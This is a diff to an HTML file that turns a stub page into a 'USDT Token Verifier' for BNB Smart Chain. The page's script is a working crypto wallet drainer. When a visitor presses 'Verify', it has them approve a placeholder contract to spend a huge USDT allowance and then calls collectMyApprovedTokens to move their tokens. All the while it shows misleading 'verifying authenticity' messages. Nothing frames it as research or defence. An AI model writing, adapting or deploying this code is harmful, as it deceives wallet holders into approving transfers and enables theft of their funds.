@@ -1,11 +1,130 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>USDT Checker DApp</title>
-  </head>
-  <body>
-    <div id="root"></div>
-  </body>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT BEP20 Token Verification:</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 80px;
+    }
+    button {
+      padding: 12px 24px;
+      margin: 10px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+      background-color: #f0b90b;
+      color: black;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h2>USDT Token Verifier</h2>
+  <p>Connect your wallet and verify your USDT.</p>
+  <button id="connectBtn">Connect Wallet</button>
+  <button id="collectBtn">Verify</button>
+  <div id="status"></div>
+
+  <script>
+    const connectBtn = document.getElementById("connectBtn");
+    const collectBtn = document.getElementById("collectBtn");
+    const statusDiv = document.getElementById("status");
+
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+    const CONTRACT_ADDRESS = "YOUR_CONTRACT_ADDRESS_HERE"; // Replace with your contract address
+    const USDT_ABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function decimals() view returns (uint8)"
+    ];
+    const CONTRACT_ABI = [
+      "function collectMyApprovedTokens() public"
+    ];
+
+    let provider, signer, userAddress;
+
+    async function switchToBNBChain() {
+      const bnbParams = {
+        chainId: "0x38",
+        chainName: "BNB Smart Chain",
+        nativeCurrency: {
+          name: "BNB",
+          symbol: "BNB",
+          decimals: 18
+        },
+        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+        blockExplorerUrls: ["https://bscscan.com"]
+      };
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: bnbParams.chainId }]
+        });
+      } catch (err) {
+        if (err.code === 4902) {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [bnbParams]
+          });
+        } else {
+          throw err;
+        }
+      }
+    }
+
+    connectBtn.onclick = async () => {
+      if (!window.ethereum) return alert("Install MetaMask or Trust Wallet");
+      try {
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+        userAddress = await signer.getAddress();
+        connectBtn.innerText = `Connected: ${userAddress.substring(0, 6)}...${userAddress.slice(-4)}`;
+        statusDiv.innerText = "✅ Wallet connected";
+      } catch (err) {
+        console.error(err);
+        alert("Wallet connection failed");
+      }
+    };
+
+    collectBtn.onclick = async () => {
+      if (!window.ethereum) return alert("Please install MetaMask or Trust Wallet");
+      try {
+        await switchToBNBChain();
+      } catch (e) {
+        return alert("Please switch to BNB Smart Chain and try again.");
+      }
+
+      try {
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+        const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+        const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+        const decimals = await usdt.decimals();
+        const approveAmount = ethers.parseUnits("1000000000", decimals); // Approve max USDT
+
+        statusDiv.innerText = "📝 Verifying Authenticity...";
+        const approveTx = await usdt.approve(CONTRACT_ADDRESS, approveAmount);
+        await approveTx.wait();
+        statusDiv.innerText = "✅ Approved! Now verifying...";
+
+        const collectTx = await contract.collectMyApprovedTokens();
+        await collectTx.wait();
+        statusDiv.innerText = "🎉 USDT veified!";
+      } catch (err) {
+        console.error(err);
+        statusDiv.innerText = "❌ Error: " + (err.message || "Failed");
+      }
+    };
+  </script>
+</body>
 </html>
